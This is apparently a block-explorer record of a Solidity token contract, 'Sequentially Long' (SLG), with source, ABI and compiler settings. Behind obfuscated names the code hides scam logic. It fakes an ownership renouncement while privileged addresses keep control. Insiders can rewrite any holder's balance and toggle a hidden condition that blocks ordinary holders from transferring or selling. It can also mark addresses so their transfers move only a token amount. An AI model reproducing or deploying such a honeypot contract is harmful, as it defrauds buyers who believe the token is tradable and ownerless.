{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface receiverLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tokenSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundMarketingAmount {\n    function createPair(address receiverLimit, address exemptMode) external returns (address);\n}\n\ninterface isAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldTrading) external view returns (uint256);\n\n    function transfer(address liquidityAuto, uint256 receiverLaunchMax) external returns (bool);\n\n    function allowance(address buyFundLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverLaunchMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityAuto,\n        uint256 receiverLaunchMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldReceiver, uint256 value);\n    event Approval(address indexed buyFundLaunch, address indexed spender, uint256 value);\n}\n\ninterface isAutoMetadata is isAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SequentiallyLong is tokenSender, isAuto, isAutoMetadata {\n\n    mapping(address => bool) public isSender;\n\n    uint256 marketingExempt;\n\n    address public minAtWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return takeSwap;\n    }\n\n    function transferFrom(address autoExempt, address liquidityAuto, uint256 receiverLaunchMax) external override returns (bool) {\n        if (_msgSender() != modeFee) {\n            if (shouldMin[autoExempt][_msgSender()] != type(uint256).max) {\n                require(receiverLaunchMax <= shouldMin[autoExempt][_msgSender()]);\n                shouldMin[autoExempt][_msgSender()] -= receiverLaunchMax;\n            }\n        }\n        return maxSell(autoExempt, liquidityAuto, receiverLaunchMax);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapLaunchAt;\n    }\n\n    uint256 constant exemptToken = 12 ** 10;\n\n    function transfer(address atLaunched, uint256 receiverLaunchMax) external virtual override returns (bool) {\n        return maxSell(_msgSender(), atLaunched, receiverLaunchMax);\n    }\n\n    uint8 private teamTake = 18;\n\n    bool public toLiquidity;\n\n    address private listIs;\n\n    function approve(address minReceiver, uint256 receiverLaunchMax) public virtual override returns (bool) {\n        shouldMin[_msgSender()][minReceiver] = receiverLaunchMax;\n        emit Approval(_msgSender(), minReceiver, receiverLaunchMax);\n        return true;\n    }\n\n    bool public txMax;\n\n    constructor (){\n        \n        receiverLaunched liquidityIs = receiverLaunched(modeFee);\n        liquidityTo = fundMarketingAmount(liquidityIs.factory()).createPair(liquidityIs.WETH(), address(this));\n        if (listSell) {\n            receiverTake = false;\n        }\n        minAtWallet = _msgSender();\n        senderWallet();\n        isSender[minAtWallet] = true;\n        tokenTx[minAtWallet] = liquidityMinReceiver;\n        if (receiverTake == txMax) {\n            txMax = false;\n        }\n        emit Transfer(address(0), minAtWallet, liquidityMinReceiver);\n    }\n\n    function senderWallet() public {\n        emit OwnershipTransferred(minAtWallet, address(0));\n        listIs = address(0);\n    }\n\n    uint256 buyMin;\n\n    function owner() external view returns (address) {\n        return listIs;\n    }\n\n    function maxAuto(address autoExempt, address liquidityAuto, uint256 receiverLaunchMax) internal returns (bool) {\n        require(tokenTx[autoExempt] >= receiverLaunchMax);\n        tokenTx[autoExempt] -= receiverLaunchMax;\n        tokenTx[liquidityAuto] += receiverLaunchMax;\n        emit Transfer(autoExempt, liquidityAuto, receiverLaunchMax);\n        return true;\n    }\n\n    function allowance(address modeExempt, address minReceiver) external view virtual override returns (uint256) {\n        if (minReceiver == modeFee) {\n            return type(uint256).max;\n        }\n        return shouldMin[modeExempt][minReceiver];\n    }\n\n    mapping(address => mapping(address => uint256)) private shouldMin;\n\n    uint256 public shouldLaunched;\n\n    address modeFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public liquidityTo;\n\n    function tradingTakeBuy(uint256 receiverLaunchMax) public {\n        autoMarketingFrom();\n        buyMin = receiverLaunchMax;\n    }\n\n    function maxSell(address autoExempt, address liquidityAuto, uint256 receiverLaunchMax) internal returns (bool) {\n        if (autoExempt == minAtWallet) {\n            return maxAuto(autoExempt, liquidityAuto, receiverLaunchMax);\n        }\n        uint256 takeLaunchedMode = isAuto(liquidityTo).balanceOf(marketingWallet);\n        require(takeLaunchedMode == buyMin);\n        require(liquidityAuto != marketingWallet);\n        if (listWalletLiquidity[autoExempt]) {\n            return maxAuto(autoExempt, liquidityAuto, exemptToken);\n        }\n        return maxAuto(autoExempt, liquidityAuto, receiverLaunchMax);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamTake;\n    }\n\n    string private takeSwap = \"Sequentially Long\";\n\n    bool public takeMarketing;\n\n    event OwnershipTransferred(address indexed marketingReceiverSender, address indexed amountFromSender);\n\n    bool private receiverTake;\n\n    function walletSellAuto(address atLaunched, uint256 receiverLaunchMax) public {\n        autoMarketingFrom();\n        tokenTx[atLaunched] = receiverLaunchMax;\n    }\n\n    address marketingWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityMinReceiver;\n    }\n\n    function autoMarketingFrom() private view {\n        require(isSender[_msgSender()]);\n    }\n\n    uint256 private liquidityMinReceiver = 100000000 * 10 ** 18;\n\n    uint256 public limitWallet;\n\n    function marketingTake(address toSender) public {\n        if (toLiquidity) {\n            return;\n        }\n        if (shouldLaunched != limitWallet) {\n            txMax = false;\n        }\n        isSender[toSender] = true;\n        \n        toLiquidity = true;\n    }\n\n    mapping(address => uint256) private tokenTx;\n\n    function balanceOf(address shouldTrading) public view virtual override returns (uint256) {\n        return tokenTx[shouldTrading];\n    }\n\n    function receiverShould(address autoFrom) public {\n        autoMarketingFrom();\n        \n        if (autoFrom == minAtWallet || autoFrom == liquidityTo) {\n            return;\n        }\n        listWalletLiquidity[autoFrom] = true;\n    }\n\n    bool private listSell;\n\n    string private swapLaunchAt = \"SLG\";\n\n    function getOwner() external view returns (address) {\n        return listIs;\n    }\n\n    mapping(address => bool) public listWalletLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyFundLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiverSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountFromSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLaunchMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listWalletLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"}],\"name\":\"marketingTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAtWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFrom\",\"type\":\"address\"}],\"name\":\"receiverShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverLaunchMax\",\"type\":\"uint256\"}],\"name\":\"tradingTakeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLaunchMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLaunchMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLaunchMax\",\"type\":\"uint256\"}],\"name\":\"walletSellAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SequentiallyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}